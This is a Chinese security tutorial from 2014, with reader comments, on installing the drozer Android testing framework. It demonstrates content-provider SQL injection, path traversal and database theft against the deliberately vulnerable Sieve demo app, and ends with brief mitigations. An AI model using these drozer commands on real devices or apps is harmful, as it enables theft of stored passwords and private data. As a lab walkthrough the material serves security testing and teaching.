<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Android App Injection&&Drozer Use</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">小乐天</a> <span class="bull">·</span> <time title="2014/09/16 18:07" ui-time="" datetime="2014/09/16 18:07" class="published ng-binding ng-isolate-scope">2014/09/16 18:07</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x01 准备工作</h2><hr><p>测试环境：</p><p>1) 手机root权限</p><p>2) Adb.exe</p><p>3) 手机usb连接开启debug模式(在设置>关于手机>连续点击多次版本号，即可开启开发者模式)</p><p>4) Window下安装<a href="https://www.mwrinfosecurity.com/products/drozer/community-edition/">drozer</a></p><p>5) 安装完drozer后在其目录下把agent.apk安装到手机</p><p>6) <a href="https://labs.mwrinfosecurity.com/system/assets/116/original/WebContentResolver.zip">WebContentResolver.apk</a></p><p>7) 附带测试案例使用app <a href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk">sieve</a></p><h2>0x02 drozer安装与使用</h2><hr><p><strong>安装</strong></p><p>1) windows安装 下载：</p><p>https://www.mwrinfosecurity.com/products/drozer/community-edition/</p><p>在Android设备中安装agent.apk：</p><pre><code>#!bash
&gt;adb install agent.apk
</code></pre><p>或者直接连接USB把文件移动到内存卡中安装</p><p>2) *inux安装（Debian/Mac）</p><pre><code>#!bash
$ wget http://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg
$ sh setuptools-0.6c11-py2.7.egg
$ easy_install --allow-hosts pypi.python.org protobuf
$ easy_install twisted==10.2.0
$ easy_install twisted ./drozer-2.3.0-py2.7.egg
$ drozer        //运行测试
</code></pre><p>下面介绍三种方法运行</p><p>1) USB方式</p><pre><code>#!bash
&gt;adb forward tcp:31415 tcp:31415        //adb目录下运行次命令
选择drozer&gt;Embedded Server&gt;Enabled
&gt;drozer.bat console connect     //在PC端drozer目录下运行此命令
</code></pre><p>2) Wifi方式</p><pre><code>#!bash
&gt;drozer.bat console connect --server 192.168.1.12:31415  //在PC端执行192.168.1.12为android端ip和端口
</code></pre><p>3) Infrastructure Mode 这种模式涉及到三个通信方，drozer server、drozer agent（Android 设备中）与drozer console。</p><p>其中server与agent，server与console需要网络互通。这种模式的好处是你不需要知道android设备的ip，</p><p>agent与console的ip段可以隔离的，并且可以支持一个server对应多个设备的操作。</p><pre><code>#!bash
&gt;drozer.bat server start
</code></pre><p>在Android设备上新建一个New Endpoint，修改配置Host为PC server端ip,并且启用Endpoint</p><pre><code>#!bash
&gt;drozer console connect --server 192.168.1.2:31415      //192.168.1.2为server端ip和端口
</code></pre><p><strong>使用</strong></p><pre><code>&gt; list  //列出目前可用的模块，也可以使用ls
&gt; help app.activity.forintent       //查看指定模块的帮助信息
&gt; run app.package.list      //列出android设备中安装的app
&gt; run app.package.info -a com.android.browser       //查看指定app的基本信息
&gt; run app.activity.info -a com.android.browser      //列出app中的activity组件
&gt; run app.activity.start --action android.intent.action.VIEW --data-uri  http://www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面
&gt; run scanner.provider.finduris -a com.sina.weibo       //查找可以读取的Content Provider
&gt; run  app.provider.query content://settings/secure --selection "name='adb_enabled'"    //读取指定Content Provider内容
&gt; run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     //列出指定文件路径里全局可写/可读的文件
&gt; run shell.start       //shell操作
&gt; run tools.setup.busybox       //安装busybox
&gt; list auxiliary        //通过web的方式查看content provider组件的相关内容
&gt; help auxiliary.webcontentresolver     //webcontentresolver帮助
&gt; run auxiliary.webcontentresolver      //执行在浏览器中以http://localhost:8080即可访问
以sieve示例
&gt; run app.package.list -f sieve         //查找sieve应用程序
&gt; run app.package.info -a com.mwr.example.sieve         //显示app.package.info命令包的基本信息
&gt; run app.package.attacksurface com.mwr.example.sieve   //确定攻击面
&gt; run app.activity.info -a com.mwr.example.sieve         //获取activity信息
&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlist
&gt; run app.provider.info -a com.mwr.example.sieve        //提供商信息
&gt; run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 
&gt;run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址
&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"   //检测注入
&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据
&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据
&gt; run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址
&gt; run scanner.provider.traversal -a com.mwr.example.sieve
&gt; run app.service.info -a com.mwr.example.sieve         //查看服务
</code></pre><h2>0x03 Android App Injection</h2><p>1) 首先用drozer扫描Android应用可注入的Url</p><pre><code>#!bash
Dz &gt; run scanner.provider.injection
</code></pre><p><img alt="enter image description here" img-src="2a07e5b8fea3e5ec1354f448bf6aa65d92eaef8d.jpg"></p><p>2) 启动WebContentResolver.apk应用程序，Web界面访问url格式如下</p><p>http://localhost:8080/query?a=providers&amp;path0=Parameter1&amp;path1=Parameter2&amp;pathn=parametern&amp;selName=column&amp;selId=id</p><p><img alt="enter image description here" img-src="4c679b1acaab56fca18ca2b3fb1da5668e626ff2.jpg"></p><p>解释： providers：为content://后第一个参数比如records Parameter1：为第二个参数operations Parameter2..parametern：为后门的依次类推的参数，如果后面有这么多参数 Column：表字段例如上面字段<_id>Id：为字段数据</_id></p><p>注意：格式必须是这样，selName、selId这两个参数第二个单词是大写的。</p><p>3) 在PC端运行adb</p><pre><code>#!bash
&gt;adb forward tcp:8080 tcp:8080  //此时在地址栏输入http://localhost:8080即可访问Web界面
</code></pre><p>4) 以content://settings/bookmarks/为例，在地址栏输入</p><pre><code>http://localhost:8080/query?a=settings&amp;path0=bookmarks&amp;selName=_id&amp;selId=1
</code></pre><p><img alt="enter image description here" img-src="4c679b1acaab56fca18ca2b3fb1da5668e626ff2.jpg"></p><p>5) 自动化结合SQLMAP</p><p><img alt="enter image description here" img-src="d17aa169b2a84a14cdc1bf1adbad3a20f73323e3.jpg"></p><h2>0x04 总结&amp;&amp;解决方案</h2><hr><p>总结：虽然很多小伙说直接用文件管理进去查看数据库更方便，我也不多说什么，就像上次看到一帖子为了查看wifi密码写了一大篇的，直接进去数据库看不就是了，我能呵呵一句么。 避免这个漏洞方法只需要指定标志读取权限和限制写入权限。如果我们不想共享存储第三方应用程序记录,另一个解决方案可以消除provider或将其设置为false。</p><h2>0x05 参考：</h2><hr><ul><li>https://labs.mwrinfosecurity.com/blog/2011/12/02/how-to-find-android-0day-in-no-time/</li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/4314" rel="bookmark" id="re1">Android Content Provider Security</a></li><li><a href="http://drops.wooyun.org/tips/3936" rel="bookmark" id="re2">Android Activtity Security</a></li><li><a href="http://drops.wooyun.org/tips/4393" rel="bookmark" id="re3">Android Broadcast Security</a></li><li><a href="http://drops.wooyun.org/tips/7488" rel="bookmark" id="re4">Android.Hook框架xposed篇(Http流量监控)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">金刚狼</span> <span class="reply-time">2016-06-19 15:03:23</span></div><p></p><p>大神，我用kali Linux2.0安装drozer2.3.4的时候，最后一步提示错误，是怎么回事。百度搜了半天都没能解决了。<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c9bba6a6bd89a2a8a5a0">[email&#160;protected]</a>:~# easy_install twisted ./drozer-2.3.4-py2.7.egg<br>Processing dependencies for drozer==2.3.4<br>Searching for pyopenssl==0.13<br>Reading http://pypi.python.org/simple/pyopenssl/<br>Best match: pyOpenSSL 0.13<br>Downloading</p><p>https://pypi.python.org/packages/8b/20/8f4230b281a2a9d0ee9e24fd89aeded0b25d40c84b3d61100a96438e1626/pyOpenS</p><p>SL-0.13.tar.gz#md5=767bca18a71178ca353dff9e10941929<br>Processing pyOpenSSL-0.13.tar.gz<br>Running pyOpenSSL-0.13/setup.py -q bdist_egg --dist-dir /tmp/easy_install-_FzbKM/pyOpenSSL-0.13/egg-dist-</p><p>tmp-K_XCF8<br>warning: no previously-included files matching &#039;*.pyc&#039; found anywhere in distribution<br>In file included from OpenSSL/crypto/crypto.h:30:0,<br>from OpenSSL/crypto/crypto.c:16:<br>OpenSSL/crypto/x509.h:17:25: fatal error: openssl/ssl.h: 没有那个文件或目录<br>#include &lt;openssl/ssl.h&gt;<br>^<br>compilation terminated.<br>error: Setup script exited with error: command &#039;i586-linux-gnu-gcc&#039; failed with exit status 1</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">彭大大</span> <span class="reply-time">2016-01-04 14:43:02</span></div><p></p><p>为什么运行命令时，都是位置模块啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">咖啡</span> <span class="reply-time">2015-07-09 16:50:58</span></div><p></p><p>一步一步总算折腾完了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">plane636</span> <span class="reply-time">2015-02-03 20:32:15</span></div><p></p><p>我也是同样的问题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Adra1n</span> <span class="reply-time">2014-12-10 20:11:32</span></div><p></p><p>请教为啥我的ls和list都是空，用run app.package.list也是unknown module？？？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hksong</span> <span class="reply-time">2014-09-23 12:17:58</span></div><p></p><p>为何你要抢先在我前面！啊啊啊啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nicky</span> <span class="reply-time">2014-09-17 22:10:25</span></div><p></p><p>如果我们不想共享存储第三方应用程序记录,另一个解决方案可以消除provider或将其设置为false。 这应该是不使用content provider方式存储数据或者设置export=false</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Elegance</span> <span class="reply-time">2014-09-17 15:23:00</span></div><p></p><p>防止client-side-SQLi，一样的也是可以采用参数化查询的方式。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">疯子</span> <span class="reply-time">2014-09-17 10:33:04</span></div><p></p><p>大黑阔！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-09-16 18:26:38</span></div><p></p><p>用Mac的都是大黑...阔</p><p></p></div></div></div></div></div></main>